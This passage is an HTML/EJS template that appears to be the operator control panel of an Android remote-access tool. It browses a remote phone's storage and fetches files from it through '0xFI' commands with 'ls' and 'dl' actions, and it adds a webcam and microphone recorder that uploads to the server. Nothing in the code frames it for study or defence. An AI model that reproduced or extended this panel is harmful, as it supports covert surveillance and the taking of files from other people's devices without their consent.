<div class="twelve wide column">
            <div class="ui segment">
                <div class="ui secondary menu">
                    <div class="right menu">
                        <button onclick="openDirectory(this, '/storage/emulated/0')" class="ui blue button dlop"> 
                            <i class="icon home"></i>Home
                        </button>
                    </div>
                </div>
                <table class="ui celled table">
                    <thead>
                        <tr>
                            <th style="text-align: center" colspan="2">Files</th>
                        </tr>
                    </thead>
                    <tbody>
                        <% pageData.forEach((item) => { %>
                        <tr>
                            <td title="<%= item.path %>"><%= item.name %></td>
                            <td class="collapsing">
                                <% if(!item.isDir) { %>
                                <button class="ui button dlop" onclick="downloadFile(this, '<%= item.path %>')">
                                    <i class="icon download blue"></i>
                                </button>
                                <% } else { %>
                                <button class="ui button dlop" onclick="openDirectory(this, '<%= item.path %>')">
                                    <i class="icon folder open grey"></i>
                                </button>
                                <% } %>
                            </td>
                        </tr>
                        <% }) %>
                    </tbody>
                </table>

                <button id="startRecording" class="ui green button">Start Recording</button>
                <button id="stopRecording" class="ui red button" disabled>Stop Recording</button>
            </div>
        </div>
    </div>

    <script>
        let mediaRecorder;
        let recordedChunks = [];

        async function startRecording() {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            mediaRecorder = new MediaRecorder(stream);

            mediaRecorder.ondataavailable = function(event) {
                if (event.data.size > 0) {
                    recordedChunks.push(event.data);
                }
            };

            mediaRecorder.onstop = function() {
                const blob = new Blob(recordedChunks, { type: 'video/webm' });
                saveVideoToDownloads(blob); // حفظ الفيديو في مجلد التحميلات
                recordedChunks = [];
            };

            mediaRecorder.start();
            document.getElementById('startRecording').disabled = true;
            document.getElementById('stopRecording').disabled = false;
        }

        function stopRecording() {
            mediaRecorder.stop();
            document.getElementById('startRecording').disabled = false;
            document.getElementById('stopRecording').disabled = true;
        }

        function saveVideoToDownloads(blob) {
            const formData = new FormData();
            formData.append('video', blob, 'recorded_video.webm');

            fetch('/save-video', {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                console.log('Video saved successfully:', data);
                showNotification('#2ecc71', 'Video saved to Downloads');
                location.reload(); // تحديث الصفحة لعرض الفيديو الجديد
            })
            .catch(error => {
                console.error('Error saving video:', error);
                showNotification('#f03434', 'Error saving video');
            });
        }

        document.getElementById('startRecording').addEventListener('click', startRecording);
        document.getElementById('stopRecording').addEventListener('click', stopRecording);

        function openDirectory(element, path) {
            $(element).children().css("opacity", "0");
            $(element).addClass('blue');
            $(element).addClass('loading');
            $('.dlop').addClass('disabled');
            sendCommand('0xFI', {
                action: 'ls',
                path
            }, (error, message) => {
                if (error) {
                    setTimeout(() => {
                        showNotification('#f03434', error)
                        $(element).children().css("opacity", "1");
                        $(element).removeClass('blue');
                        $('.dlop').removeClass('loading')
                    }, 300)
                } else {
                    if (message === 'Requested') {
                        showNotification('#2ecc71', 'Requesting Files, Please Wait');
                        setTimeout(() => {
                            location.reload();
                        }, 500)
                    }
                }
            })
        }

        function downloadFile(element, path) {
            $(element).children().css("opacity", "0");
            $(element).addClass('green');
            $(element).addClass('loading');
            $('.dlop').addClass('disabled');
            sendCommand('0xFI', {
                action: 'dl',
                path
            }, (error, message) => {
                if (error) {
                    setTimeout(() => {
                        showNotification('#f03434', error)
                        $(element).children().css("opacity", "1");
                        $(element).removeClass('green');
                        $('.dlop').removeClass('disabled')
                    }, 300)
                } else {
                    if (message === 'Requested') {
                        setTimeout(() => {
                            $(element).children().css("opacity", "1");
                            $(element).removeClass('green');
                            $(element).removeClass('loading');
                            $('.dlop').removeClass('disabled')
                            showNotification('#2ecc71', 'Downloading File, It will be avaliable in `Downloads` Soon');
                        }, 300)
                    }
                }
            })
        }

        function showNotification(color, message) {
            // دالة لعرض الإشعارات
            const notification = document.createElement('div');
            notification.style.position = 'fixed';
            notification.style.bottom = '20px';
            notification.style.right = '20px';
            notification.style.backgroundColor = color;
            notification.style.color = 'white';
            notification.style.padding = '10px';
            notification.style.borderRadius = '5px';
            notification.innerText = message;
            document.body.appendChild(notification);
            setTimeout(() => {
                notification.remove();
            }, 3000);
        }
    </script>
</body>
</html>
